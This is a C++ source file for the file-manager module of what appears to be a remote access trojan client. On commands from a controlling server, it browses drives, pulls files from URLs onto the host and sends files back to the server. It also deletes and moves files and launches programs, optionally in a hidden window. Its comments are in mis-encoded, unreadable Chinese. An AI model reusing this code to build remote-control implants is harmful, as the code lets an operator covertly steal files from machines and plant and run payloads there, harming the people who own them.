#include "FileManager.h"
#include "FileDownloader.h"
#include "FileMgrSearch.h"
#include "FileTrans.h"
#include "IOCPClient.h"
#include <process.h>

#include "Manager.h"

CFileManager::CFileManager(CManager*pManager) :
CMsgHandler(pManager, FILE_MANAGER)
{
	//init buffer.
	m_pCurDir = (TCHAR*)calloc(0x10000, sizeof(TCHAR));
	m_SrcPath = (TCHAR*)calloc(0x10000, sizeof(TCHAR));
	m_FileList = (TCHAR*)calloc(0x10000, sizeof(TCHAR));

	m_bMove = FALSE;
}


CFileManager::~CFileManager()
{
	if (m_pCurDir){
		free(m_pCurDir);
		m_pCurDir = NULL;
	}
	if (m_SrcPath){
		free(m_SrcPath);
		m_SrcPath = NULL;
	}
	if (m_FileList){
		free(m_FileList);
		m_FileList = NULL;
	}
}

static void BeginFileTrans(char* szServerAddr, unsigned short uPort, LPVOID lpParam)
{
	CManager *pManager = new CManager();

	CIOCPClient *pClient = new CIOCPClient(pManager,
		szServerAddr, uPort);

	CMsgHandler *pHandler = new CFileTrans(pManager, (CFileTrans::CMiniFileTransInit*)lpParam);

	pManager->Associate(pClient, pHandler);
	pClient->Run();

	delete pHandler;
	delete pClient;
	delete pManager;

}

static  void BeginDownload(char* szServerAddr, unsigned short uPort, LPVOID lpParam)
{

	CManager *pManager = new CManager();

	CIOCPClient *pClient = new CIOCPClient(pManager,
		szServerAddr, uPort);

	CMsgHandler *pHandler = new CFileDownloader(pManager, (CFileDownloader::InitParam*)lpParam);

	pManager->Associate(pClient, pHandler);
	pClient->Run();

	delete pHandler;
	delete pClient;
	delete pManager;
}

static void BeginSearch(char* szServerAddr, unsigned short uPort, LPVOID lpParam)
{

	CManager *pManager = new CManager();

	CIOCPClient *pClient = new CIOCPClient(pManager,
		szServerAddr, uPort);

	CMsgHandler *pHandler = new CFileMgrSearch(pManager);

	pManager->Associate(pClient, pHandler);
	pClient->Run();

	delete pHandler;
	delete pClient;
	delete pManager;
}

typedef void(*ModuleEntry)(char* szServerAddr, unsigned short uPort, LPVOID dwParam);

struct ModuleCtx{
	char szServerAddr[32];
	USHORT uPort;
	LPVOID lpParam;
	ModuleEntry lpEntry;
};

static void __stdcall RunSubModule(ModuleCtx*pModuleCtx){

	pModuleCtx->lpEntry(pModuleCtx->szServerAddr, pModuleCtx->uPort,
		pModuleCtx->lpParam);

	if (pModuleCtx->lpParam){
		free(pModuleCtx->lpParam);
		pModuleCtx->lpParam = NULL;
	}
	
	free(pModuleCtx);
	printf("RunSubModule return\n ");
	_endthreadex(0);
}

void CFileManager::OnClose()
{

}
void CFileManager::OnOpen()
{

}

void CFileManager::OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer)
{
	switch (Msg)
	{
	case FILE_MGR_CHDIR:
		OnChangeDir(Buffer);
		break;
	case FILE_MGR_GETLIST:
		OnGetCurList();
		break;
	case FILE_MGR_UP:
		OnUp();
		break;
	case FILE_MGR_SEARCH:
		OnSearch();
		break;
	case FILE_MGR_UPLOADFROMDISK:
		OnUploadFromDisk(Buffer);
		break;
	case FILE_MGR_UPLOADFRURL:
		OnUploadFromUrl(Buffer);
		break;
	case FILE_MGR_DOWNLOAD:
		OnDownload(Buffer);
		break;
	case FILE_MGR_RUNFILE_HIDE:
	case FILE_MGR_RUNFILE_NORMAL:
		OnRunFile(Msg, Buffer);
		break;
	case FILE_MGR_REFRESH:
		OnRefresh();
		break;
	case FILE_MGR_NEWFOLDER:
		OnNewFolder();
		break;
	case FILE_MGR_RENAME:
		OnRename(Buffer);
		break;
	case FILE_MGR_DELETE:
		OnDelete(Buffer);
		break;
	case FILE_MGR_COPY:
		OnCopy(Buffer);
		break;
	case FILE_MGR_CUT:
		OnCut(Buffer);
		break;
	case FILE_MGR_PASTE:
		OnPaste(Buffer);
		break;
	//echo
	case FILE_MGR_PREV_DOWNLOAD:
		SendMsg(FILE_MGR_PREV_DOWNLOAD, 0, 0);
		break;

	case FILE_MGR_ECHO:
		SendMsg(*(WORD*)Buffer, 0, 0);
		break;

	}
}



void CFileManager::OnUp()
{
	TCHAR*pNewDir = (TCHAR*)malloc(sizeof(TCHAR) *(lstrlenW(m_pCurDir) + 1));
	lstrcpy(pNewDir, m_pCurDir);

	int PathLen = lstrlenW(pNewDir);
	if (PathLen){
		if (PathLen > 3){
			TCHAR*p = pNewDir + lstrlenW(pNewDir) - 1;
			while (p >= pNewDir && p[0] != '\\' && p[0] != '/')
				p--;
			p[0] = 0;
		}
		else
			pNewDir[0] = 0;
	}
	OnChangeDir((char*)pNewDir);
	free(pNewDir);
}
//�޸�Ŀ¼,������Ӧ���ڳɹ�֮��������List.;

void CFileManager::OnChangeDir(char*Buffer)
{
	//һ���ֽ�statu + CurLocation + List.;
	TCHAR*pNewDir = (TCHAR*)Buffer;
	BOOL bStatu = ChDir(pNewDir);
	DWORD dwBufLen = 0;
	dwBufLen += 1;
	dwBufLen += sizeof(TCHAR) *(lstrlenW(m_pCurDir) + 1);
	char*Buff = (char*)malloc(dwBufLen);
	Buff[0] = bStatu;
	lstrcpy((TCHAR*)&Buff[1], m_pCurDir);
	SendMsg(FILE_MGR_CHDIR_RET, Buff, dwBufLen);
	free(Buff);
}

void CFileManager::OnGetCurList()
{
	if (!lstrlenW(m_pCurDir)){
		SendDriverList();
	}
	else{
		SendFileList();
	}
}

void CFileManager::SendDriverList()
{
	DriverInfo	dis[26] = { 0 };				//���26
	DWORD		dwUsed = 0;
	DWORD dwDrivers = GetLogicalDrives();
	TCHAR szRoot[] = { 'A',':','\\',0 };
	while (dwDrivers){
		if (dwDrivers & 1){
			DriverInfo*pDi = &dis[dwUsed++];
			pDi->szName[0] = szRoot[0];

			GetVolumeInformationW(szRoot, 0, 0, 0, 0, 0, pDi->szFileSystem, 128);

			SHFILEINFOW si = { 0 };
			SHGetFileInfoW(szRoot, FILE_ATTRIBUTE_NORMAL, &si, sizeof(si), SHGFI_USEFILEATTRIBUTES | SHGFI_DISPLAYNAME | SHGFI_TYPENAME);
			lstrcpy(&pDi->szName[1], si.szDisplayName);
			lstrcpy(pDi->szTypeName, si.szTypeName);

			GetDiskFreeSpaceExW(szRoot, 0, &pDi->Total, &pDi->Free);

			pDi->dwType = GetDriveTypeW(szRoot);
		}
		dwDrivers >>= 1;
		szRoot[0]++;
	}
	//���ͻظ�.
	SendMsg(FILE_MGR_GETLIST_RET, (char*)&dis, sizeof(DriverInfo) * dwUsed);
}


void CFileManager::SendFileList()
{
	TCHAR *StartDir = (TCHAR*)malloc((lstrlenW(m_pCurDir) + 3) * sizeof(TCHAR));
	lstrcpy(StartDir, m_pCurDir);
	lstrcat(StartDir, L"\\*");

	DWORD	dwCurBuffSize = 0x10000;		//64kb
	char*	FileList = (char*)malloc(dwCurBuffSize);
	DWORD	dwUsed = 0;

	WIN32_FIND_DATAW fd = { 0 };
	HANDLE hFirst = FindFirstFileW(StartDir, &fd);
	BOOL bNext = TRUE;
	while (hFirst != INVALID_HANDLE_VALUE && bNext)
	{
		if (!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) ||
			(wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L".."))
			)
		{
			if ((dwCurBuffSize - dwUsed) <
				(sizeof(FmFileInfo) + sizeof(TCHAR) * lstrlen(fd.cFileName)))
			{
				dwCurBuffSize *= 2;
				FileList = (char*)realloc(FileList, dwCurBuffSize);
			}

			FmFileInfo*pFmFileInfo = (FmFileInfo*)(FileList + dwUsed);
			pFmFileInfo->dwFileAttribute = fd.dwFileAttributes;
			pFmFileInfo->dwFileSizeHi = fd.nFileSizeHigh;
			pFmFileInfo->dwFileSizeLo = fd.nFileSizeLow;

			memcpy(&pFmFileInfo->dwLastWriteLo, &fd.ftLastWriteTime, sizeof(FILETIME));

			lstrcpy(pFmFileInfo->szFileName, fd.cFileName);

			dwUsed += (((char*)(pFmFileInfo->szFileName) - (char*)pFmFileInfo) + sizeof(TCHAR)* (lstrlenW(fd.cFileName) + 1));
		}

		bNext = FindNextFileW(hFirst, &fd);
	}

	FindClose(hFirst);
	free(StartDir);
	//������һ��������Ϊ��β.;
	if ((dwCurBuffSize - dwUsed) < sizeof(FmFileInfo))
	{
		dwCurBuffSize *= 2;
		FileList = (char*)realloc(FileList, dwCurBuffSize);
	}
	FmFileInfo*pFmFileInfo = (FmFileInfo*)(FileList + dwUsed);
	memset(pFmFileInfo, 0, sizeof(FmFileInfo));
	dwUsed += sizeof(FmFileInfo);

	//���ͻظ�.;
	SendMsg(FILE_MGR_GETLIST_RET, FileList, dwUsed);
	free(FileList);
}

BOOL CFileManager::ChDir(const TCHAR* Dir)
{
	BOOL bResult = FALSE;
	BOOL bIsDrive = FALSE;
	//��Ŀ¼;
	if (Dir[0] == 0)
	{
		memset(m_pCurDir, 0, 0x10000);
		return TRUE;
	}
	//
	TCHAR	*pTemp = (TCHAR*)malloc(sizeof(TCHAR) * (lstrlenW(Dir) + 3));
	lstrcpy(pTemp, Dir);

	if ((Dir[0] <'A' || Dir[0]>'Z') &&
		(Dir[0] <'a' || Dir[0]>'z'))
		return FALSE;
	if (Dir[1] != ':' && (Dir[2] != 0 && Dir[2] != '\\' && Dir[2] != '/'))
		return FALSE;
	//����\\*
	lstrcat(pTemp, L"\\*");
	const TCHAR*pIt = &pTemp[3];
	TCHAR*pNew = &pTemp[2];
	while (pNew[0])
	{
		*pNew++ = '\\';
		//����\\,/
		while(pIt[0] && (pIt[0] == '/' || pIt[0] == '\\'))
			pIt++;
		//�ҵ��ļ���
		while (pIt[0] && (pIt[0] != '/' && pIt[0] != '\\'))
			*pNew++ = *pIt++;
		//�����ļ���֮��,������'\\' '/'���߿�.
		*pNew = *pIt++;
	}
	//�̷�
	WIN32_FIND_DATAW fd = { 0 };
	//��һ������ļ����Ƿ���Է���.
	HANDLE hFile = FindFirstFileW(pTemp, &fd);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		bResult = TRUE;
		lstrcpy(m_pCurDir, pTemp);
		//ȥ��*
		m_pCurDir[lstrlenW(m_pCurDir) - 1] = 0;

		if (lstrlenW(m_pCurDir)>3)
			m_pCurDir[lstrlenW(m_pCurDir) - 1] = 0;	//�Ǹ�Ŀ¼,ȥ������
	}

	if (hFile != INVALID_HANDLE_VALUE)
		FindClose(hFile);		
	
	free(pTemp);
	return bResult;
}


void CFileManager::OnUploadFromUrl(char*lpszUrl)
{
	//Save Path + Url,Init param.
	CFileDownloader::InitParam*pInitParam = (CFileDownloader::InitParam*)
		calloc(1, sizeof(DWORD) + sizeof(TCHAR)* (lstrlenW(m_pCurDir) + 1 + lstrlenW((TCHAR*)lpszUrl) + 1));

	pInitParam->dwFlags &= 0;

	lstrcpy(pInitParam->szURL, m_pCurDir);
	lstrcat(pInitParam->szURL, L"\n");
	lstrcat(pInitParam->szURL, ((TCHAR*)lpszUrl));
	//
	ModuleCtx*pCtx = (ModuleCtx*)malloc(sizeof(ModuleCtx));
	
	pCtx->lpEntry = BeginDownload;
	pCtx->lpParam = pInitParam;

	const auto peer = GetPeerName();
	lstrcpyA(pCtx->szServerAddr, peer.first.c_str());
	pCtx->uPort = peer.second;
	//
	typedef unsigned int(__stdcall *typeThreadProc)(void*);

	HANDLE hThread = (HANDLE)_beginthreadex(0, 0, (typeThreadProc)RunSubModule, pCtx, 0, 0);

	if (hThread){
		CloseHandle(hThread);
	}
}
void CFileManager::OnUploadFromDisk(char*FileList)
{
	ModuleCtx*pCtx = (ModuleCtx*)malloc(sizeof(ModuleCtx));
	pCtx->lpEntry = BeginFileTrans;
	pCtx->lpParam = NULL;
	////��ȡ������
	const auto peer = GetPeerName();
	lstrcpyA(pCtx->szServerAddr, peer.first.c_str());
	pCtx->uPort = peer.second;

	CFileTrans::CMiniFileTransInit*pInitParam = (CFileTrans::CMiniFileTransInit*)
		malloc(sizeof(DWORD) + sizeof(TCHAR)*(lstrlenW(m_pCurDir) + 1 + lstrlenW((TCHAR*)FileList) + 1));
	
	pInitParam->m_dwDuty = MNFT_DUTY_RECEIVER;
	lstrcpy(pInitParam->m_Buffer, m_pCurDir);
	lstrcat(pInitParam->m_Buffer, L"\n");
	lstrcat(pInitParam->m_Buffer, (TCHAR*)FileList);
	////Get Init Data.
	pCtx->lpParam = pInitParam;

	typedef unsigned int(__stdcall *typeThreadProc)(void*);
	HANDLE hThread = (HANDLE)_beginthreadex(0, 0, (typeThreadProc)RunSubModule, pCtx, 0, 0);

	if (hThread){
		CloseHandle(hThread);
	}
}

void CFileManager::OnDownload(char*FileList)
{
	ModuleCtx*pCtx = (ModuleCtx*)malloc(sizeof(ModuleCtx));
	pCtx->lpEntry = BeginFileTrans;
	pCtx->lpParam = NULL;
	////��ȡ������
	auto const peer = GetPeerName();
	lstrcpyA(pCtx->szServerAddr, peer.first.c_str());
	pCtx->uPort = peer.second;

	CFileTrans::CMiniFileTransInit*pInitParam = (CFileTrans::CMiniFileTransInit*)
		malloc(sizeof(DWORD) + sizeof(TCHAR)*(lstrlenW((TCHAR*)FileList) + 1));

	pInitParam->m_dwDuty = MNFT_DUTY_SENDER;
	lstrcpy(pInitParam->m_Buffer, (TCHAR*)FileList);
	////Get Init Data.
	pCtx->lpParam = pInitParam;

	typedef unsigned int(__stdcall *typeThreadProc)(void*);
	HANDLE hThread = (HANDLE)_beginthreadex(0, 0, (typeThreadProc)RunSubModule, pCtx, 0, 0);

	if (hThread){
		CloseHandle(hThread);
	}
}

void CFileManager::OnRunFile(DWORD Event,char*buffer)
{
	DWORD dwShow = SW_SHOWNORMAL;
	if (Event == FILE_MGR_RUNFILE_HIDE)
		dwShow = SW_HIDE;

	TCHAR*pIt = (TCHAR*)buffer;
	while (pIt[0])
	{
		//����\n;
		while (pIt[0] && pIt[0] == '\n') 
			pIt++;
		if (pIt[0])
		{
			TCHAR*pFileName = pIt;
			//�ҵ���β.;
			while (pIt[0] && pIt[0] != '\n') pIt++;
			TCHAR old = pIt[0];
			pIt[0] = 0;
			//
			TCHAR*pFile = (TCHAR*)malloc((lstrlenW(m_pCurDir)+ 1 + lstrlenW(pFileName) + 1) * sizeof(TCHAR));
			lstrcpy(pFile, m_pCurDir);
			lstrcat(pFile, L"\\");
			lstrcat(pFile, pFileName);

			ShellExecute(NULL, L"open", pFile, NULL, m_pCurDir, dwShow);

			free(pFile);
			pIt[0] = old;
		}
	}
}

void CFileManager::OnRefresh()
{
	OnChangeDir((char*)m_pCurDir);
}

#include "utils.h"

void CFileManager::OnNewFolder()
{
	//����....
	TCHAR szError[0x100];

	if (lstrlen(m_pCurDir) == 0)
		return;
	for (int i = 0; i < 0x7fffffff;i++){
		//make dir name...
		TCHAR DirName[MAX_PATH] = TEXT("New Folder");
		if (i){
			_t_sprintf(DirName, TEXT("New Folder (%d)"), i);
		}
		//calc path length
		size_t len = sizeof(TCHAR)*(lstrlen(m_pCurDir) +
			1 + lstrlen(DirName) + 1);
		//alloc buffer..
		TCHAR * NewDirFullName = new TCHAR[len];
		memset(NewDirFullName, 0, len);
		
		_t_sprintf(NewDirFullName, TEXT("%s\\%s"), m_pCurDir, DirName);

		BOOL Success = CreateDirectory(NewDirFullName, NULL);
		
		//
		if (Success){
			WIN32_FIND_DATA fd = { 0 };
			if (INVALID_HANDLE_VALUE == FindFirstFile(NewDirFullName, &fd)){
				_t_sprintf(szError, TEXT("FindFirstFile Failed With Error :%d "), GetLastError());
				SendMsg(FILE_MGR_ERROR, szError, (lstrlen(szError) + 1) * sizeof(TCHAR));
				delete[] NewDirFullName;
				return;
			}

			size_t len = sizeof(DWORD) * 5 + sizeof(TCHAR) * (lstrlen(fd.cFileName) + 1);
			FmFileInfo * info = (FmFileInfo*)new char[len];
			info->dwFileAttribute = fd.dwFileAttributes;
			info->dwFileSizeHi = fd.nFileSizeHigh;
			info->dwFileSizeLo = fd.nFileSizeLow;

			info->dwLastWriteHi = fd.ftLastWriteTime.dwHighDateTime;
			info->dwLastWriteLo = fd.ftLastWriteTime.dwLowDateTime;

			lstrcpy(info->szFileName, fd.cFileName);
			SendMsg(FILE_MGR_NEW_FOLDER_SUCCESS, info, len);
			delete info;
			delete[] NewDirFullName;
			return;
		}
		//
		if (GetLastError() != ERROR_ALREADY_EXISTS){
			_t_sprintf(szError, TEXT("CreateDirectory Failed With Error :%d "), GetLastError());
			SendMsg(FILE_MGR_ERROR, szError, (lstrlen(szError) + 1) * sizeof(TCHAR));
			delete[] NewDirFullName;
			return;
		}
	}
}
void CFileManager::OnRename(char*buffer)
{
	if (lstrlen(m_pCurDir) == 0)
		return;

	TCHAR*pNewName = NULL;

	if ((pNewName = wcsstr((TCHAR*)buffer, TEXT("\n"))) == 0)
		return;

	*pNewName++ = 0;

	TCHAR*pOldFile = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlen(m_pCurDir) + 1 + lstrlen((TCHAR*)buffer) + 1));
	TCHAR*pNewFile = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlen(m_pCurDir) + 1 + lstrlen(pNewName) + 1));
	
	lstrcpy(pOldFile, m_pCurDir);
	lstrcpy(pNewFile, m_pCurDir);

	lstrcat(pOldFile, TEXT("\\"));
	lstrcat(pNewFile, TEXT("\\"));

	lstrcat(pOldFile, (TCHAR*)buffer);
	lstrcat(pNewFile, pNewName);
	MoveFile(pOldFile, pNewFile);

	free(pOldFile);
	free(pNewFile);
}


BOOL MakesureDirExist(const TCHAR* Path, BOOL bIncludeFileName = FALSE);

typedef void(*callback)(TCHAR*szFile, BOOL bIsDir, DWORD dwParam);

static void dfs_BrowseDir(TCHAR*Dir, callback pCallBack,DWORD dwParam)
{
	TCHAR*pStartDir = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlenW(Dir) + 3));
	lstrcpy(pStartDir, Dir);
	lstrcat(pStartDir, L"\\*");

	WIN32_FIND_DATAW fd = { 0 };
	BOOL bNext = TRUE;
	HANDLE hFindFile = FindFirstFileW(pStartDir, &fd);
	while (hFindFile != INVALID_HANDLE_VALUE && bNext)
	{
		if (!(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY) ||
			(wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L"..")))
		{
			TCHAR*szFileName = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlenW(Dir) + 1 + lstrlenW(fd.cFileName) + 1));
			lstrcpy(szFileName, Dir);
			lstrcat(szFileName, TEXT("\\"));
			lstrcat(szFileName, fd.cFileName);

			//Ŀ¼�Ļ��ȱ���
			if (fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			{
				dfs_BrowseDir(szFileName, pCallBack,dwParam);
			}
			pCallBack(szFileName, fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY, dwParam);
			free(szFileName);
		}
		bNext =  FindNextFileW(hFindFile, &fd);
	}
	if (hFindFile)
		 FindClose(hFindFile);
	free(pStartDir);
}

void FMDeleteFile(TCHAR*szFileName, BOOL bIsDir,DWORD dwParam)
{
	if (bIsDir)
	{
		RemoveDirectoryW(szFileName);
		return;
	}
	DeleteFileW(szFileName);
}

void CFileManager::OnDelete(char*buffer)
{
	if (lstrlenW(m_pCurDir) == 0)
		return;
	//�ļ�����\n����
	TCHAR*pIt = (TCHAR*)buffer;
	TCHAR*pFileName;
	while (pIt[0])
	{
		//����\n
		pFileName = NULL;
		while (pIt[0] && pIt[0] == '\n')
			pIt++;
		if (pIt[0])
		{
			pFileName = pIt;
			//�ҵ���β.
			while (pIt[0] && pIt[0] != '\n')
				pIt++;
			TCHAR old = pIt[0];
			pIt[0] = 0;
			//
			TCHAR*szFile = (TCHAR*)malloc(sizeof(TCHAR) * (lstrlen(m_pCurDir) + 1 + lstrlen(pFileName) + 1));
			lstrcpy(szFile, m_pCurDir);
			lstrcat(szFile, L"\\");
			lstrcat(szFile, pFileName);
			//
			WIN32_FIND_DATAW fd;

			HANDLE hFindFile = FindFirstFileW(szFile, &fd);
			if (hFindFile != INVALID_HANDLE_VALUE){
				if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
					dfs_BrowseDir(szFile,FMDeleteFile,0);
					RemoveDirectoryW(szFile);
				}
				else
				{
					DeleteFileW(szFile);
				}
				FindClose(hFindFile);
			}
			free(szFile);
			//
			pIt[0] = old;
		}
	}
}

void CFileManager::OnCopy(char*buffer)
{
	TCHAR*p = NULL;
	if ((p = wcsstr((TCHAR*)buffer, L"\n")))
	{
		*p++ = NULL;
		lstrcpy(m_SrcPath, (TCHAR*)buffer);
		lstrcpy(m_FileList, p);
		m_bMove = FALSE;
	}
}
	

void CFileManager::OnCut(char*buffer)
{
	TCHAR*p = NULL;
	if ((p = wcsstr((TCHAR*)buffer, L"\n")))
	{
		*p++ = NULL;
		lstrcpy(m_SrcPath, (TCHAR*)buffer);
		lstrcpy(m_FileList, p);
		m_bMove = TRUE;
	}
}

void CFileManager::FMCpOrMvFile(TCHAR*szFileName, BOOL bIsDir, DWORD dwParam)
{
	//���Ʋ���Ŀ¼���ù�,��Ŀ¼����������ļ��Ѿ���������.
	CFileManager*pMgr = (CFileManager*)dwParam;
	TCHAR*pNewFileName = NULL;
	if (bIsDir)
	{
		if (pMgr->m_bMove)
			RemoveDirectoryW(szFileName);
		return;
	}
	pNewFileName = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlen(pMgr->m_pCurDir) + 1 +
		lstrlen(szFileName) - lstrlen(pMgr->m_SrcPath) + 1));
	//
	lstrcpy(pNewFileName, pMgr->m_pCurDir);
	lstrcat(pNewFileName, szFileName + lstrlen(pMgr->m_SrcPath));
	//ȷ��Ŀ¼����
	MakesureDirExist(pNewFileName, 1);
	if (pMgr->m_bMove)
		MoveFileW(szFileName, pNewFileName);
	else
		CopyFileW(szFileName, pNewFileName,FALSE);
	free(pNewFileName);
}

/*
	2022-10-24
	1.���ҳ������ļ������������������͸�������ܸ���
	2.û���һ��֮�󣬾ͷ�һ����Ϣ��(���ȸ���)

*/

void CFileManager::OnPaste(char*buffer)
{
	//��������������Ŀ¼����
	if (lstrlenW(m_pCurDir) == 0 || lstrlenW(m_SrcPath) == 0)
		return;
	//����һ��Ŀ¼����,����Ҫ����
	if (wcscmp(m_pCurDir, m_SrcPath) == 0)
		return;

	TCHAR*pIt = m_FileList;
	TCHAR*pFileName;
	while (pIt[0])
	{
		pFileName = NULL;
		while (pIt[0] && pIt[0] == '\n')
			pIt++;
		if (pIt[0])
		{
			pFileName = pIt;
			//�ҵ���β.
			while (pIt[0] && pIt[0] != '\n')
				pIt++;
			TCHAR old = pIt[0];
			pIt[0] = 0;
			//Դ�ļ�
			TCHAR*szSrcFile = (TCHAR*)malloc(sizeof(TCHAR) * (lstrlen(m_SrcPath) + 1 + lstrlen(pFileName) + 1));
			lstrcpy(szSrcFile, m_SrcPath);
			lstrcat(szSrcFile, L"\\");
			lstrcat(szSrcFile, pFileName);
			//�������Ŀ¼���Ƶ��Լ�����Ŀ¼����
			DWORD dwSrcLen = lstrlen(szSrcFile);
			DWORD dwDestLen = lstrlen(m_pCurDir);
			if (dwDestLen >= dwSrcLen && !memcmp(m_pCurDir, szSrcFile, dwSrcLen) 
				&& (m_pCurDir[dwSrcLen] == 0 || m_pCurDir[dwSrcLen] == '\\'))
			{
				//C:\asdasf --> C:\asdasf\aaaaa ,��������������.ò�Ƶݹ��ͣ������
			}
			else
			{
				WIN32_FIND_DATAW fd = { 0 };
				HANDLE hFindFile = FindFirstFileW(szSrcFile, &fd);
				if (hFindFile != INVALID_HANDLE_VALUE)
				{
					if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						dfs_BrowseDir(szSrcFile, FMCpOrMvFile, (DWORD)this);
						if (m_bMove)
						{
							RemoveDirectoryW(szSrcFile);
						}
					}
					else
					{
						//�����ļ�,���ƻ��ƶ�����ǰĿ¼.
						TCHAR*pNewFile = (TCHAR*)malloc(sizeof(TCHAR)*(lstrlenW(m_pCurDir) + 1 + lstrlenW(fd.cFileName) + 1));
						lstrcpy(pNewFile, m_pCurDir);
						lstrcat(pNewFile, L"\\");
						lstrcat(pNewFile, fd.cFileName);
						//
						if (m_bMove)
							MoveFileW(szSrcFile, pNewFile);
						else
							CopyFileW(szSrcFile, pNewFile, FALSE);
						free(pNewFile);
					}
					FindClose(hFindFile);
				}
			}
			free(szSrcFile);
			pIt[0] = old;
		}
	}
}

void CFileManager::OnSearch()
{
	ModuleCtx*pCtx = (ModuleCtx*)malloc(sizeof(ModuleCtx));
	pCtx->lpEntry = BeginSearch;
	pCtx->lpParam = NULL;
	
	const auto peer = GetPeerName();
	lstrcpyA(pCtx->szServerAddr, peer.first.c_str());
	pCtx->uPort = peer.second;

	typedef unsigned int(__stdcall *typeThreadProc)(void*);

	HANDLE hThread = (HANDLE)_beginthreadex(0, 0, (typeThreadProc)RunSubModule, pCtx, 0, 0);

	if (hThread){
		CloseHandle(hThread);
	}
}
